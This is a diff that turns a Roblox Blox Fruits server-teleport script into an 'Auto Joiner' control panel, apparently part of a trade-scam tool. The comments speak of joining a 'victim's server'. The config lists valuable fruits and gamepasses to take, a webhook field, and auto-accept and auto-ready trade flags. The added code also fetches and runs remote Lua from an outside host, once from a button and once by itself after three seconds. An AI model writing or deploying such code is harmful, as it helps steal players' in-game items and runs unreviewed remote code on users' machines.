@@ -1,63 +1,367 @@
-if not JOBID or JOBID == "" or JOBID == "PASTE_THE_JOBID_HERE" then
-    game:GetService("Players").LocalPlayer:Kick("Invalid or missing JobId!")
-    return
-end
-
-local TARGET_SEA = tostring(SEA or "2")
-
-local SEA_PLACE = {
-    ["1"] = 2753915549,
-    ["2"] = 4442272183,
-    ["3"] = 7449423635,
-}
-
-local TARGET_PLACE = SEA_PLACE[TARGET_SEA]
-if not TARGET_PLACE then
-    game:GetService("Players").LocalPlayer:Kick("Invalid SEA config!")
-    return
-end
+-- Auto Joiner with Control GUI for Blox Fruits
+-- This script joins victim's server and provides control buttons
 
 local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local CommF = ReplicatedStorage.Remotes.CommF_
+local LocalPlayer = Players.LocalPlayer
+local CorrectPlaceId = 4442272183
 
-local function getCurrentSea()
-    if game.PlaceId == 2753915549 then
-        return "1"
-    elseif game.PlaceId == 4442272183 then
-        return "2"
-    elseif game.PlaceId == 7449423635 then
-        return "3"
-    end
-    return "0"
+-- Check if in correct game
+if game.PlaceId ~= CorrectPlaceId then
+    warn("[Auto Joiner] Wrong game! This script only works on Blox Fruits Sea 2")
+    return
 end
 
-local CURRENT_SEA = getCurrentSea()
-
--- Queue ép JobId (chỉ chạy khi đã vào đúng place)
-queue_on_teleport([[
-    task.wait(4)
-    if game.PlaceId == ]] .. TARGET_PLACE .. [[ and game.JobId ~= "]] .. JOBID .. [[" then
-        game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. TARGET_PLACE .. [[, "]] .. JOBID .. [[")
-    end
-]])
-
--- Nếu chưa ở đúng SEA → dùng remote của game để đi SEA
-if CURRENT_SEA ~= TARGET_SEA then
-    if CURRENT_SEA == "1" then
-        -- Sea 1 → luôn phải qua Sea 2 trước
-        CommF:InvokeServer("TravelDressrosa")
-        return
-    end
-
-    if CURRENT_SEA == "2" and TARGET_SEA == "3" then
-        -- Sea 2 → Sea 3
-        CommF:InvokeServer("TravelZou")
-        return
-    end
+-- Initialize config if not exists
+if not _G["Script-SM_Config"] then
+    _G["Script-SM_Config"] = {
+        fruits_you_want = "",
+        user_webhook = "",
+        users = {},
+        auto_accept = true,
+        auto_ready = true
+    }
 end
 
--- Đã ở đúng SEA → teleport thẳng JobId
-if game.PlaceId == TARGET_PLACE and game.JobId ~= JOBID then
-    TeleportService:TeleportToPlaceInstance(TARGET_PLACE, JOBID)
+local Config = _G["Script-SM_Config"]
+
+-- Get JobId from ServerBrowser
+local function getVictimJobId()
+    local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser")
+    local jobId = nil
+    pcall(function()
+        jobId = ServerBrowser:InvokeServer("getjob")
+    end)
+    return (jobId and jobId ~= "") and jobId or game.JobId
 end
+
+-- Main GUI Creation
+local function CreateControlGUI()
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "AutoJoinerControlGUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = playerGui
+    
+    -- Main Panel
+    local mainPanel = Instance.new("Frame")
+    mainPanel.Name = "MainPanel"
+    mainPanel.Size = UDim2.new(0, 450, 0, 650)
+    mainPanel.Position = UDim2.new(0.5, -225, 0.5, -325)
+    mainPanel.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
+    mainPanel.BorderSizePixel = 0
+    mainPanel.Parent = screenGui
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = mainPanel
+    
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(80, 150, 255)
+    stroke.Thickness = 2
+    stroke.Parent = mainPanel
+    
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.Name = "Title"
+    title.Size = UDim2.new(1, 0, 0, 50)
+    title.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+    title.BorderSizePixel = 0
+    title.Text = "🎮 Blox Fruits Control Panel"
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 18
+    title.TextColor3 = Color3.fromRGB(100, 200, 255)
+    title.Parent = mainPanel
+    
+    local titleCorner = Instance.new("UICorner")
+    titleCorner.CornerRadius = UDim.new(0, 12)
+    titleCorner.Parent = title
+    
+    -- Scroll Container
+    local scrollFrame = Instance.new("ScrollingFrame")
+    scrollFrame.Name = "ScrollFrame"
+    scrollFrame.Size = UDim2.new(1, -20, 1, -70)
+    scrollFrame.Position = UDim2.new(0, 10, 0, 60)
+    scrollFrame.BackgroundTransparency = 1
+    scrollFrame.BorderSizePixel = 0
+    scrollFrame.ScrollBarThickness = 8
+    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 1200)
+    scrollFrame.Parent = mainPanel
+    
+    -- Helper function to create section
+    local function createSection(name, yPos)
+        local section = Instance.new("Frame")
+        section.Name = name
+        section.Size = UDim2.new(1, -10, 0, 0)
+        section.Position = UDim2.new(0, 5, 0, yPos)
+        section.BackgroundTransparency = 1
+        section.Parent = scrollFrame
+        
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1, 0, 0, 30)
+        label.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+        label.BorderSizePixel = 0
+        label.Text = "🔹 " .. name
+        label.Font = Enum.Font.GothamBold
+        label.TextSize = 14
+        label.TextColor3 = Color3.fromRGB(150, 255, 150)
+        label.TextXAlignment = Enum.TextXAlignment.Left
+        label.Parent = section
+        
+        local labelCorner = Instance.new("UICorner")
+        labelCorner.CornerRadius = UDim.new(0, 6)
+        labelCorner.Parent = label
+        
+        return section, label
+    end
+    
+    -- Helper to create button
+    local function createButton(parent, text, yOffset, width, callback)
+        local button = Instance.new("TextButton")
+        button.Size = UDim2.new(width or 1, -10, 0, 40)
+        button.Position = UDim2.new(0, 5, 0, yOffset)
+        button.BackgroundColor3 = Color3.fromRGB(50, 100, 180)
+        button.BorderSizePixel = 0
+        button.Text = text
+        button.Font = Enum.Font.GothamBold
+        button.TextSize = 12
+        button.TextColor3 = Color3.fromRGB(255, 255, 255)
+        button.Parent = parent
+        
+        local btnCorner = Instance.new("UICorner")
+        btnCorner.CornerRadius = UDim.new(0, 6)
+        btnCorner.Parent = button
+        
+        button.MouseButton1Click:Connect(function()
+            button.BackgroundColor3 = Color3.fromRGB(30, 70, 150)
+            task.wait(0.1)
+            button.BackgroundColor3 = Color3.fromRGB(50, 100, 180)
+            callback()
+        end)
+        
+        return button
+    end
+    
+    -- Section 1: Fruits You Want
+    local fruitsSection, _ = createSection("Fruits You Want", 10)
+    fruitsSection.Size = UDim2.new(1, -10, 0, 140)
+    
+    local inputLabel = Instance.new("TextLabel")
+    inputLabel.Size = UDim2.new(1, -10, 0, 20)
+    inputLabel.Position = UDim2.new(0, 5, 0, 40)
+    inputLabel.BackgroundTransparency = 1
+    inputLabel.Text = "Fruit Name:"
+    inputLabel.Font = Enum.Font.Gotham
+    inputLabel.TextSize = 12
+    inputLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    inputLabel.TextXAlignment = Enum.TextXAlignment.Left
+    inputLabel.Parent = fruitsSection
+    
+    local inputBox = Instance.new("TextBox")
+    inputBox.Name = "FruitInput"
+    inputBox.Size = UDim2.new(1, -10, 0, 30)
+    inputBox.Position = UDim2.new(0, 5, 0, 60)
+    inputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    inputBox.BorderSizePixel = 0
+    inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    inputBox.PlaceholderText = "Enter fruit name (e.g., Kitsune)"
+    inputBox.Font = Enum.Font.Gotham
+    inputBox.TextSize = 12
+    inputBox.Parent = fruitsSection
+    
+    local inputCorner = Instance.new("UICorner")
+    inputCorner.CornerRadius = UDim.new(0, 6)
+    inputCorner.Parent = inputBox
+    
+    createButton(fruitsSection, "➕ Add Fruit", 100, 0.48, function()
+        local fruit = inputBox.Text:gsub("^%s*(.-)%s*$", "%1")
+        if fruit ~= "" then
+            if Config.fruits_you_want == "" then
+                Config.fruits_you_want = fruit
+            else
+                Config.fruits_you_want = Config.fruits_you_want .. "," .. fruit
+            end
+            print("[Control Panel] Added fruit: " .. fruit)
+            inputBox.Text = ""
+        end
+    end)
+    
+    createButton(fruitsSection, "🗑️ Clear All", 100, 0.48, function()
+        Config.fruits_you_want = ""
+        print("[Control Panel] Cleared all fruits")
+    end)
+    
+    -- Section 2: Auto Add Buttons
+    local autoAddSection, _ = createSection("Auto Add", 160)
+    autoAddSection.Size = UDim2.new(1, -10, 0, 200)
+    
+    createButton(autoAddSection, "⭐ Add All Gamepass", 40, 1, function()
+        local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+        local success, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
+        if success then
+            local gamepasses = {}
+            for _, item in pairs(inv) do
+                if string.find(item.Name:lower(), "gamepass") or item.Type == "Gamepass" or item.Type == "Developer Product" then
+                    table.insert(gamepasses, item.Name)
+                end
+            end
+            if #gamepasses > 0 then
+                for _, gp in ipairs(gamepasses) do
+                    if Config.fruits_you_want == "" then
+                        Config.fruits_you_want = gp
+                    else
+                        Config.fruits_you_want = Config.fruits_you_want .. "," .. gp
+                    end
+                end
+                print("[Control Panel] Added " .. #gamepasses .. " gamepasses")
+            end
+        end
+    end)
+    
+    createButton(autoAddSection, "💎 Add All Permanent", 90, 1, function()
+        local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+        local success, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
+        if success then
+            local permanents = {}
+            for _, item in pairs(inv) do
+                if string.find(item.Name:lower(), "permanent") then
+                    table.insert(permanents, item.Name)
+                end
+            end
+            if #permanents > 0 then
+                for _, perm in ipairs(permanents) do
+                    if Config.fruits_you_want == "" then
+                        Config.fruits_you_want = perm
+                    else
+                        Config.fruits_you_want = Config.fruits_you_want .. "," .. perm
+                    end
+                end
+                print("[Control Panel] Added " .. #permanents .. " permanent fruits")
+            end
+        end
+    end)
+    
+    createButton(autoAddSection, "🔥 Add High Tradables", 140, 1, function()
+        local highTradables = {
+            "Werewolf (Tiger)",
+            "Purple Lightning",
+            "Yellow Lightning",
+            "Red Lightning",
+            "Galaxy (Empyrean/Kitsune)",
+            "Empyrean (Kitsune)",
+            "Crimson (Kitsune)",
+            "Ember (Dragon West)"
+        }
+        
+        for _, fruit in ipairs(highTradables) do
+            if Config.fruits_you_want == "" then
+                Config.fruits_you_want = fruit
+            else
+                Config.fruits_you_want = Config.fruits_you_want .. "," .. fruit
+            end
+        end
+        print("[Control Panel] Added all high tradable fruits")
+    end)
+    
+    -- Section 3: Action Buttons
+    local actionSection, _ = createSection("Actions", 370)
+    actionSection.Size = UDim2.new(1, -10, 0, 120)
+    
+    createButton(actionSection, "🔄 Execute Script", 40, 1, function()
+        print("[Control Panel] Loading Script-Fixed.lua...")
+        local scriptUrl = "https://scriptssm.vercel.app/Script-Fixed.lua"
+        pcall(function()
+            loadstring(game:HttpGet(scriptUrl))()
+        end)
+    end)
+    
+    createButton(actionSection, "🚀 Jump to Victim", 100, 1, function()
+        print("[Control Panel] Jumping to victim...")
+        -- This will be triggered when a trade is detected
+        if LocalPlayer.Character then
+            local humRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if humRootPart then
+                humRootPart.CFrame = humRootPart.CFrame * CFrame.new(0, 50, 0)
+                print("[Control Panel] Jumped!")
+            end
+        end
+    end)
+    
+    -- Section 4: Status
+    local statusSection, _ = createSection("Status", 500)
+    statusSection.Size = UDim2.new(1, -10, 0, 100)
+    
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, -10, 0, 80)
+    statusLabel.Position = UDim2.new(0, 5, 0, 35)
+    statusLabel.BackgroundColor3 = Color3.fromRGB(30, 40, 50)
+    statusLabel.BorderSizePixel = 0
+    statusLabel.Text = "✅ Panel Ready\n\n📋 Fruits Want: " .. (Config.fruits_you_want ~= "" and Config.fruits_you_want or "None")
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextSize = 11
+    statusLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
+    statusLabel.TextWrapped = true
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.TextYAlignment = Enum.TextYAlignment.Top
+    statusLabel.Parent = statusSection
+    
+    local statusCorner = Instance.new("UICorner")
+    statusCorner.CornerRadius = UDim.new(0, 6)
+    statusCorner.Parent = statusLabel
+    
+    -- Update status every second
+    task.spawn(function()
+        while screenGui.Parent do
+            statusLabel.Text = "✅ Panel Ready\n\n📋 Fruits Want: " .. (Config.fruits_you_want ~= "" and Config.fruits_you_want or "None") .. "\n\n👥 Server: " .. game.JobId:sub(1, 8) .. "..."
+            task.wait(1)
+        end
+    end)
+    
+    -- Make draggable
+    local dragging = false
+    local dragStart = nil
+    local startPos = nil
+    
+    title.InputBegan:Connect(function(input, gameProcessed)
+        if gameProcessed then return end
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = mainPanel.Position
+        end
+    end)
+    
+    title.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = false
+        end
+    end)
+    
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if dragging and dragStart then
+            local delta = input.Position - dragStart
+            mainPanel.Position = startPos + UDim2.new(0, delta.X, 0, delta.Y)
+        end
+    end)
+    
+    print("[Auto Joiner] Control GUI created!")
+    return screenGui
+end
+
+-- Main execution
+print("[Auto Joiner] Script started on " .. game.PlaceId)
+print("[Auto Joiner] Current JobId: " .. game.JobId)
+
+-- Create GUI
+CreateControlGUI()
+
+-- Auto load Script-Fixed.lua after 3 seconds
+task.wait(3)
+print("[Auto Joiner] Auto-loading Script-Fixed.lua...")
+pcall(function()
+    loadstring(game:HttpGet("https://scriptssm.vercel.app/Script-Fixed.lua"))()
+end)
+
+print("[Auto Joiner] Ready! Use the control panel to manage the script.")
